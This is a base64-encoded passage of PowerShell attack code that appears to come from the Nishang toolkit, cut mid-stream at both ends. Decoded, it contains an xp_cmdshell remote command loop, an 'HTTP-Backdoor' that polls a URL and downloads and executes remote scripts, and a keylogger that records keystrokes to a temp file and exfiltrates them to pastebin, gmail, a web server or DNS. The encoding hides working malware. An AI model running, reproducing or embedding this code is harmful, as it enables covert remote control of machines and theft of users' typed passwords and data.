AgICAgICB7CiAgICAgICAgICAgIHdyaXRlLWhvc3QgImBuYG5TdGFydGluZyBjbWQgc2hlbGwgb24gdGhlIHRhcmdldC4uYG4iCiAgICAgICAgICAgIHdyaXRlLWhvc3QgLU5vTmV3bGluZSAiQ01EICRDb21wdXRlck5hbWU+ICIKICAgICAgICAgICAgJHBheWxvYWQgPSByZWFkLWhvc3QKICAgICAgICAgICAgJGNtZCA9ICJFWEVDIHhwX2NtZHNoZWxsICdjbWQuZXhlIC9LICRwYXlsb2FkJyIKICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAKICAgICAgICAkQ29tbWFuZC5Db21tYW5kVGV4dCA9ICIkY21kIgogICAgICAgICRSZWFkZXIgPSAkQ29tbWFuZC5FeGVjdXRlUmVhZGVyKCkKICAgICAgICB3aGlsZSAoJHJlYWRlci5SZWFkKCkpIHsKICAgICAgICAgICAgTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsKICAgICAgICAgICAgTmFtZSA9ICRyZWFkZXIuR2V0VmFsdWUoMCkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkQ29ubmVjdGlvbi5DbG9zZSgpCiAgICB9CiAgICB9CiAgICBDYXRjaCB7CiAgICAgICRlcnJvclswXQogICAgfQp9CgoKZnVuY3Rpb24gSFRUUC1CYWNrZG9vcgp7Cgo8IwouU1lOT1BTSVMKUGF5bG9hZCB3aGljaCBxdWVyaWVzIGEgVVJMIGZvciBpbnN0cnVjdGlvbnMgYW5kIHRoZW4gZG93bmxvYWRzIGFuZCBleGVjdXRlcyBhIHBvd2Vyc2hlbGwgc2NyaXB0LgoKLkRFU0NSSVBUSU9OClRoaXMgcGF5bG9hZCBxdWVyaWVzIHRoZSBnaXZlbiBVUkwgYW5kIGFmdGVyIGEgc3VpdGFibGUgY29tbWFuZCAoZ2l2ZW4gYnkgTWFnaWNTdHJpbmcgdmFyaWFibGUpIGlzIGZvdW5kLCAKaXQgZG93bmxvYWRzIGFuZCBleGVjdXRlcyBhIHBvd2Vyc2hlbGwgc2NyaXB0LiBUaGUgcGF5bG9hZCBjb3VsZCBiZSBzdG9wcGVkIHJlbW90ZWx5IGlmIHRoZSBzdHJpbmcgYXQgQ2hlY2tVUkwgbWF0Y2hlcwp0aGUgc3RyaW5nIGdpdmVuIGluIFN0b3BTdHJpbmcgdmFyaWFibGUuCgouUEFSQU1FVEVSIENoZWNrVVJMClRoZSBVUkwgd2hpY2ggdGhlIHBheWxvYWQgd291bGQgcXVlcnkgZm9yIGluc3RydWN0aW9ucy4KCi5QQVJBTUVURVIgUGF5bG9hZFVSTApUaGUgVVJMIGZyb20gd2hlcmUgdGhlIHBvd2Vyc2hlbGwgc2NyaXB0IHdvdWxkIGJlIGRvd25sb2FkZWQuCgouUEFSQU1FVEVSIEFyZ3VtZW50cwpBcmd1bWVudHMgdG8gYmUgcGFzc2VkIHRvIGEgc2NyaXB0LiBQb3dlcnByZXRlciBhbmQgb3RoZXIgc2NyaXB0cyBpbiBOaXNoYW5nIG5lZWQgdGhlIGZ1bmN0aW9uIG5hbWUgYW5kIGFyZ3VtZW50cyBoZXJlLgoKLlBBUkFNRVRFUiBNYWdpY1N0cmluZwpUaGUgc3RyaW5nIHdoaWNoIHdvdWxkIGFjdCBhcyBhbiBpbnN0cnVjdGlvbiB0byB0aGUgcGF5bG9hZCB0byBwcm9jZWVkIHdpdGggZG93bmxvYWQgYW5kIGV4ZWN1dGUuCgouUEFSQU1FVEVSIFN0b3BTdHJpbmcKVGhlIHN0cmluZyB3aGljaCBpZiBmb3VuZCBhdCBDaGVja1VSTCB3aWxsIHN0b3AgdGhlIHBheWxvYWQuCgouRXhhbXBsZQoKUFMgPiBIVFRQLUJhY2tkb29yCgpUaGUgcGF5bG9hZCB3aWxsIGFzayBmb3IgYWxsIHJlcXVpcmVkIG9wdGlvbnMuCgouRVhBTVBMRQpQUyA+IEhUVFAtQmFja2Rvb3IgLUNoZWNrVVJMIGh0dHA6Ly9wYXN0ZWJpbi5jb20vcmF3LnBocD9pPWpxUDJ2SjN4IC1QYXlsb2FkVVJMIGh0dHA6Ly9wYXN0ZWJpbi5jb20vcmF3LnBocD9pPVpoeWY4cndoIC1Bcmd1bWVudHMgR2V0LUluZm9ybWF0aW9uIC1NYWdpY1N0cmluZyBzdGFydDEyMyAtU3RvcFN0cmluZyBzdG9wdGhpcwoKVXNlIGFib3ZlIHdoZW4gdXNpbmcgdGhlIHBheWxvYWQgZnJvbSBub24taW50ZXJhY3RpdmUgc2hlbGxzLgoKLkVYQU1QTEUKUFMgPiBIVFRQLUJhY2tkb29yIC1DaGVja1VSTCBodHRwOi8vcGFzdGViaW4uY29tL3Jhdy5waHA/aT1qcVAydkozeCAtUGF5bG9hZFVSTCBodHRwOi8vcGFzdGViaW4uY29tL3Jhdy5waHA/aT1aaHlmOHJ3aCAtQXJndW1lbnRzIEdldC1JbmZvcm1hdGlvbiAtTWFnaWNTdHJpbmcgc3RhcnQxMjMgLVN0b3BTdHJpbmcgc3RvcHRoaXMgfCBEby1FeGZpbHRyYXRpb24gLUV4ZmlsT3B0aW9uIEROUyAtRG9tYWluTmFtZSBleGFtcGxlLmNvbSAtQXV0aE5TIDE5Mi4xNjguMjU0LjIyOAoKVXNlIGFib3ZlIGNvbW1hbmQgZm9yIGRhdGEgZXhmaWx0cmF0aW9uIHRvIGEgRE5TIHNlcnZlciB3aGljaCBsb2dzIFRYVCBxdWVyaWVzLgoKCi5MSU5LCmh0dHA6Ly9sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCiM+CgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIFBhcmFtKAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENoZWNrVVJMLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBheWxvYWRVUkwsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEFyZ3VtZW50cyA9ICJPdXQtTnVsbCIsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTWFnaWNTdHJpbmcsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0LCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU3RvcFN0cmluZwogICAgKQoKICAgd2hpbGUoJHRydWUpCiAgICB7CiAgICAgICAgJGV4ZWMgPSAwCiAgICAgICAgc3RhcnQtc2xlZXAgLXNlY29uZHMgNQogICAgICAgICR3ZWJjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50CiAgICAgICAgJGZpbGVjb250ZW50ID0gJHdlYmNsaWVudC5Eb3dubG9hZFN0cmluZygiJENoZWNrVVJMIikKICAgICAgICBpZigkZmlsZWNvbnRlbnQgLWVxICRNYWdpY1N0cmluZykKICAgICAgICB7CiAgICAgICAgICAgICRwYXN0ZXZhbHVlID0gSW52b2tlLUV4cHJlc3Npb24gJHdlYmNsaWVudC5Eb3dubG9hZFN0cmluZygkUGF5bG9hZFVSTCkKICAgICAgICAgICAgIyBDaGVjayBmb3IgYXJndW1lbnRzIHRvIHRoZSBkb3dubG9hZGVkIHNjcmlwdC4KICAgICAgICAgICAgaWYgKCRBcmd1bWVudHMgLW5lICJPdXQtTnVsbCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRwYXN0ZXZhbHVlID0gSW52b2tlLUV4cHJlc3Npb24gJEFyZ3VtZW50cyAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgfQogICAgICAgICAgICAkcGFzdGV2YWx1ZQogICAgICAgICAgICAkZXhlYysrCiAgICAgICAgICAgIGlmICgkZXhlYyAtZXEgMSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNjAKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRmaWxlY29udGVudCAtZXEgJFN0b3BTdHJpbmcpCiAgICAgICAgewogICAgICAgICAgICBicmVhawogICAgICAgIH0KICAgIH0KICAgIAp9CgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNMb2dzIHRoZSBrZXlzIGluIHRoZSBjb250ZXh0IG9mIGN1cnJlbnQgdXNlci4jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCmZ1bmN0aW9uIEtleWxvZ2dlcgp7Cgo8IwouU1lOT1BTSVMKUGF5bG9hZCB3aGljaCBsb2dzIGtleXMuCgouREVTQ1JJUFRJT04KVGhpcyBwYXlsb2FkIGxvZ3MgYSB1c2VyJ3Mga2V5cyBhbmQgd3JpdGVzIHRoZW0gdG8gZmlsZSBrZXkubG9nIChJIGtub3cgaXRzIGJhZCA6fCkgaW4gdXNlcidzIHRlbXAgZGlyZWN0b3J5LgpTYXZlZCBrZXlzIGNvdWxkIHRoZW4gYmUgZGVjb2RlZCB1c2luZyB0aGUgUGFyc2VfS2V5IHNjcmlwdC4KCi5QQVJBTUVURVIgQ2hlY2tVUkwKVGhlIFVSTCB3aGljaCB3b3VsZCBjb250YWluIHRoZSBNYWdpY1N0cmluZyB1c2VkIHRvIHN0b3Aga2V5bG9nZ2luZy4KCi5QQVJBTUVURVIgTWFnaWNTdHJpbmcKVGhlIHN0cmluZyB3aGljaCB3aGVuIGZvdW5kIGF0IENoZWNrVVJMIHdpbGwgc3RvcCB0aGUga2V5bG9nZ2VyLgoKLkVYQU1QTEUKUFMgPiBLZXlsb2dnZXIKVGhlIHBheWxvYWQgd2lsbCBhc2sgZm9yIGFsbCByZXF1aXJlZCBvcHRpb25zLgoKLkVYQU1QTEUKUFMgPiBLZXlsb2dnZXIgaHR0cDovL2V4YW1wbGUuY29tIHN0b3B0aGlzClVzZSBhYm92ZSB3aGVuIHVzaW5nIHRoZSBwYXlsb2FkIGZyb20gbm9uLWludGVyYWN0aXZlIHNoZWxscyBvciB5b3UgZG9uJ3Qgd2FudCB0aGUgcGF5bG9hZCB0byBhc2sgZm9yIGFueSBvcHRpb25zLgoKLkVYQU1QTEUKUFMgPiBLZXlsb2dnZXIgaHR0cDovL2V4YW1wbGUuY29tIHN0b3B0aGlzIC1leGZpbCA8ZGV2X2tleT4gPHVzZXJuYW1lPiA8cGFzcz4gMiAKVXNlIGFib3ZlIHdoZW4gdXNpbmcgdGhlIHBheWxvYWQgZnJvbSBub24taW50ZXJhY3RpdmUgc2hlbGxzLiBUaGlzIHdpbGwgZXhmaWx0cmF0ZSBrZXlzIHRvIGdtYWlsLgoKCi5MSU5LCmh0dHA6Ly9sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCiM+CiAgICAKICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lPSJub2V4ZmlsIildIFBhcmFtKCAKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkcGVyc2lzdCwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJGV4ZmlsLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJzZXRuYW1lPSJub2V4ZmlsIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ2hlY2tVUkwsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyc2V0bmFtZT0iZXhmaWwiKV0KICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlcnNldG5hbWU9Im5vZXhmaWwiKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRNYWdpY1N0cmluZywKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICRGYWxzZSwgUGFyYW1ldGVyc2V0bmFtZT0iZXhmaWwiKV0gW1ZhbGlkYXRlU2V0KCJnbWFpbCIsInBhc3RlYmluIiwiV2ViU2VydmVyIiwiRE5TIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRXhmaWxPcHRpb24sCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildIAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJGRldl9rZXkgPSAibnVsbCIsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0LCBNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkdXNlcm5hbWUgPSAibnVsbCIsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA1LCBNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkcGFzc3dvcmQgPSAibnVsbCIsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA2LCBNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVVJMID0gIm51bGwiLAogICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNywgTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbk5hbWUgPSAibnVsbCIsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA4LCBNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQXV0aE5TID0gIm51bGwiICAgCiAgIAogICAgKQoKJGZ1bmN0aW9ucyA9ICB7CgpmdW5jdGlvbiBLZXlsb2cKewogICAgUGFyYW0gKCAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE1hZ2ljU3RyaW5nLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENoZWNrVVJMCiAgICApCiAgICAKICAgICRzaWduYXR1cmUgPSBAIiAKICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQuQXV0bywgRXhhY3RTcGVsbGluZz10cnVlKV0gCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBzaG9ydCBHZXRBc3luY0tleVN0YXRlKGludCB2aXJ0dWFsS2V5Q29kZSk7IAoiQCAKICAgICRnZXRLZXlTdGF0ZSA9IEFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICRzaWduYXR1cmUgLW5hbWUgIk5ld3R5cGUiIC1uYW1lc3BhY2UgbmV3bmFtZXNwYWNlIC1wYXNzVGhydSAKICAgICRjaGVjayA9IDAKICAgIHdoaWxlICgkdHJ1ZSkgCiAgICB7IAogICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNDAgCiAgICAgICAgJGxvZ2dlZCA9ICIiIAogICAgICAgICRyZXN1bHQ9IiIgCiAgICAgICAgJHNoaWZ0X3N0YXRlPSIiIAogICAgICAgICRjYXBzX3N0YXRlPSIiIAogICAgICAgIGZvciAoJGNoYXI9MTskY2hhciAtbGUgMjU0OyRjaGFyKyspIAogICAgICAgIHsgCiAgICAgICAgICAgICR2a2V5ID0gJGNoYXIgCiAgICAgICAgICAgICRsb2dnZWQgPSAkZ2V0S2V5U3RhdGU6OkdldEFzeW5jS2V5U3RhdGUoJHZrZXkpIAogICAgICAgICAgICBpZiAoJGxvZ2dlZCAtZXEgLTMyNzY3KSAKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgIGlmKCgkdmtleSAtZ2UgNDgpIC1hbmQgKCR2a2V5IC1sZSA1NykpIAogICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAkbGVmdF9zaGlmdF9zdGF0ZSA9ICRnZXRLZXlTdGF0ZTo6R2V0QXN5bmNLZXlTdGF0ZSgxNjApIAogICAgICAgICAgICAgICAgICAgICRyaWdodF9zaGlmdF9zdGF0ZSA9ICRnZXRLZXlTdGF0ZTo6R2V0QXN5bmNLZXlTdGF0ZSgxNjEpIAogICAgICAgICAgICAgICAgICAgICAgICBpZigoJGxlZnRfc2hpZnRfc3RhdGUgLWVxIC0zMjc2OCkgLW9yICgkcmlnaHRfc2hpZnRfc3RhdGUgLWVxIC0zMjc2OCkpIAogICAgICAgICAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICJTLSIgKyAkdmtleSAKICAgICAgICAgICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkdmtleSAKICAgICAgICAgICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgZWxzZWlmKCgkdmtleSAtZ2UgNjQpIC1hbmQgKCR2a2V5IC1sZSA5MCkpIAogICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAkbGVmdF9zaGlmdF9zdGF0ZSA9ICRnZXRLZXlTdGF0ZTo6R2V0QXN5bmNLZXlTdGF0ZSgxNjApIAogICAgICAgICAgICAgICAgICAgICRyaWdodF9zaGlmdF9zdGF0ZSA9ICRnZXRLZXlTdGF0ZTo6R2V0QXN5bmNLZXlTdGF0ZSgxNjEpIAogICAgICAgICAgICAgICAgICAgICRjYXBzX3N0YXRlID0gW2NvbnNvbGVdOjpDYXBzTG9jayAKICAgICAgICAgICAgICAgICAgICBpZighKCgkbGVmdF9zaGlmdF9zdGF0ZSAtZXEgLTMyNzY4KSAtb3IgKCRyaWdodF9zaGlmdF9zdGF0ZSAtZXEgLTMyNzY4KSkgLXhvciAkY2Fwc19zdGF0ZSkgCiAgICAgICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICJTLSIgKyAkdmtleSAKICAgICAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgICAgIGVsc2UgCiAgICAgICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICR2a2V5IAogICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgZWxzZWlmKCgoJHZrZXkgLWdlIDE4NikgLWFuZCAoJHZrZXkgLWxlIDE5MikpIC1vciAoKCR2a2V5IC1nZSAyMTkpIC1hbmQgKCR2a2V5IC1sZSAyMjIpKSkgCiAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICRsZWZ0X3NoaWZ0X3N0YXRlID0gJGdldEtleVN0YXRlOjpHZXRBc3luY0tleVN0YXRlKDE2MCkgCiAgICAgICAgICAgICAgICAgICAgJHJpZ2h0X3NoaWZ0X3N0YXRlID0gJGdldEtleVN0YXRlOjpHZXRBc3luY0tleVN0YXRlKDE2MSkgCiAgICAgICAgICAgICAgICAgICAgaWYoKCRsZWZ0X3NoaWZ0X3N0YXRlIC1lcSAtMzI3NjgpIC1vciAoJHJpZ2h0X3NoaWZ0X3N0YXRlIC1lcSAtMzI3NjgpKSAKICAgICAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gIlMtIiArICR2a2V5IAogICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICR2a2V5IAogICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICR2a2V5IAogICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICRub3cgPSBHZXQtRGF0ZTsgCiAgICAgICAgICAgICAgICAkbG9nTGluZSA9ICIkcmVzdWx0ICIgCiAgICAgICAgICAgICAgICAkZmlsZW5hbWUgPSAiJGVudjp0ZW1wXGtleS5sb2ciIAogICAgICAgICAgICAgICAgT3V0LUZpbGUgLUZpbGVQYXRoICRmaWxlTmFtZSAtQXBwZW5kIC1JbnB1dE9iamVjdCAiJGxvZ0xpbmUiIAoKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkY2hlY2srKwogICAgICAgIGlmICgkY2hlY2sgLWVxIDYwMDApCiAgICAgICAgewogICAgICAgICAgICAkd2ViY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudAogICAgICAgICAgICAkZmlsZWNvbnRlbnQgPSAkd2ViY2xpZW50LkRvd25sb2FkU3RyaW5nKCIkQ2hlY2tVUkwiKQogICAgICAgICAgICBpZiAoJGZpbGVjb250ZW50IC1lcSAkTWFnaWNTdHJpbmcpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGNoZWNrID0gMAogICAgICAgIH0KICAgIH0KfQoKCiAgICBmdW5jdGlvbiBLZXlwYXN0ZQogICAgewogICAgICAgIFBhcmFtICggCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRFeGZpbE9wdGlvbiwKICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJGRldl9rZXksCiAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICR1c2VybmFtZSwKCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRwYXNzd29yZCwKICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJFVSTCwKCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA1LCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRBdXRoTlMsCgogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNiwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAkTWFnaWNTdHJpbmcsCiAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA3LCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRDaGVja1VSTAogICAgICAgICkKCiAgICAgICAgJGNoZWNrID0gMAogICAgICAgIHdoaWxlKCR0cnVlKSAKICAgICAgICB7IAogICAgICAgICAgICAkcmVhZCA9IDAKICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNSAKICAgICAgICAgICAgJHBhc3RldmFsdWU9R2V0LUNvbnRlbnQgJGVudjp0ZW1wXGtleS5sb2cgCiAgICAgICAgICAgICRyZWFkKysKICAgICAgICAgICAgaWYgKCRyZWFkIC1lcSAzMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgT3V0LUZpbGUgLUZpbGVQYXRoICRlbnY6dGVtcFxrZXkubG9nIC1Gb3JjZSAtSW5wdXRPYmplY3QgIiAiIAogICAgICAgICAgICAgICAgJHJlYWQgPSAwCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJG5vdyA9IEdldC1EYXRlOyAKICAgICAgICAgICAgJG5hbWUgPSAkZW52OkNPTVBVVEVSTkFNRSAKICAgICAgICAgICAgJHBhc3RlX25hbWUgPSAkbmFtZSArICIgOiAiICsgJG5vdy5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygiZGQvTU0veXl5eSBISDptbTpzczpmZmYiKQogICAgICAgICAgICBmdW5jdGlvbiBwb3N0X2h0dHAoJHVybCwkcGFyYW1ldGVycykgCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAkaHR0cF9yZXF1ZXN0ID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IE1zeG1sMi5YTUxIVFRQIAogICAgICAgICAgICAgICAgJGh0dHBfcmVxdWVzdC5vcGVuKCJQT1NUIiwgJHVybCwgJGZhbHNlKSAKICAgICAgICAgICAgICAgICRodHRwX3JlcXVlc3Quc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIikgCiAgICAgICAgICAgICAgICAkaHR0cF9yZXF1ZXN0LnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtbGVuZ3RoIiwgJHBhcmFtZXRlcnMubGVuZ3RoKTsgCiAgICAgICAgICAgICAgICAkaHR0cF9yZXF1ZXN0LnNldFJlcXVlc3RIZWFkZXIoIkNvbm5lY3Rpb24iLCAiY2xvc2UiKSAKICAgICAgICAgICAgICAgICRodHRwX3JlcXVlc3Quc2VuZCgkcGFyYW1ldGVycykgCiAgICAgICAgICAgICAgICAkc2NyaXB0OnNlc3Npb25fa2V5PSRodHRwX3JlcXVlc3QucmVzcG9uc2VUZXh0IAogICAgICAgICAgICB9IAoKICAgICAgICAgICAgZnVuY3Rpb24gQ29tcHJlc3MtRW5jb2RlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNDb21wcmVzc2lvbiBsb2dpYyBmcm9tIGh0dHA6Ly9ibG9nLmthcnN0ZWluLWNvbnN1bHRpbmcuY29tLzIwMTAvMTAvMTkvaG93LXRvLWVtYmVkZC1jb21wcmVzc2VkLXNjcmlwdHMtaW4tb3RoZXItcG93ZXJzaGVsbC1zY3JpcHRzLwogICAgICAgICAgICAgICAgJGVuY2RhdGEgPSBbc3RyaW5nXTo6Sm9pbigiYG4iLCAkcGFzdGV2YWx1ZSkKICAgICAgICAgICAgICAgICRtcyA9IE5ldy1PYmplY3QgU3lzdGVtLklPLk1lbW9yeVN0cmVhbQogICAgICAgICAgICAgICAgJGNzID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uQ29tcHJlc3Npb24uR1ppcFN0cmVhbSgkbXMsIFtTeXN0ZW0uSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6Q29tcHJlc3MpCiAgICAgICAgICAgICAgICAkc3cgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5TdHJlYW1Xcml0ZXIoJGNzKQogICAgICAgICAgICAgICAgJHN3LldyaXRlKCRlbmNkYXRhKQogICAgICAgICAgICAgICAgJHN3LkNsb3NlKCk7CiAgICAgICAgICAgICAgICAkQ29tcHJlc3NlZCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJG1zLlRvQXJyYXkoKSkKICAgICAgICAgICAgICAgICRDb21wcmVzc2VkCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkZXhmaWxvcHRpb24gLWVxICJwYXN0ZWJpbiIpCi